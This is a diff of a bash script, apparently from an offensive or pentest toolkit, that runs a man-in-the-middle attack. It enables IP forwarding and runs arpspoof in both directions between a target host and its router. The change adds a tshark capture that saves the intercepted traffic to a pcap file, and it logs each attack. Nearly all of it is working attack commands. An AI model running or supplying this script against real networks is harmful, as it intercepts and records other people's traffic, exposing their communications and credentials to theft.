@@ -90,12 +90,13 @@ fi
 
 # Create directory and set path to save results
 mkdir -p ../logs/$target/attacks
-SAVE_PATH="../logs/$target/attacks/Man_in_the_Middle.txt"
+SAVE_PATH="../logs/$target/attacks/MitM.pcap"
 
 # Log Man in the Middle attack
 echo "$DATETIME" >> $LOG_PATH
 echo "Man in the Middle attack conducted on $target" >> $LOG_PATH
 echo "Routed from router IP address $router" >> $LOG_PATH
+echo "pcap file saved in logs/$target/attacks/MitM.pcap" >> $LOG_PATH
 echo "" >> $LOG_PATH
 
 # enable ip forwarding
@@ -105,17 +106,19 @@ sudo sysctl -w net.ipv4.ip_forward=1
 echo "[!] Man in the Middle attack will start in 1 second."
 sleep 1
 
-# qterminal -e sudo arpspoof -i $interface -t $target $router
-# PID1=$!
-# qterminal -e sudo arpspoof -i $interface -t $router $target
-# PID2=$!
-
 sudo arpspoof -i $interface -t $target $router > /dev/null 2>&1 &
 sudo arpspoof -i $interface -t $router $target > /dev/null 2>&1 &
+
+# Run tshark
+tshark -i eth0 -w $SAVE_PATH > /dev/null 2>&1 &
 
 read -p "[!] Press enter to stop spoofing " input
 
 # Kill processes
 sudo pkill -2 "arpspoof"
+pkill -2 "tshark"
+
 # disable ip forwarding when script is terminated
 sudo sysctl -w net.ipv4.ip_forward=0
+
+echo "pcap file saved in logs/$target/attacks/MitM.pcap"
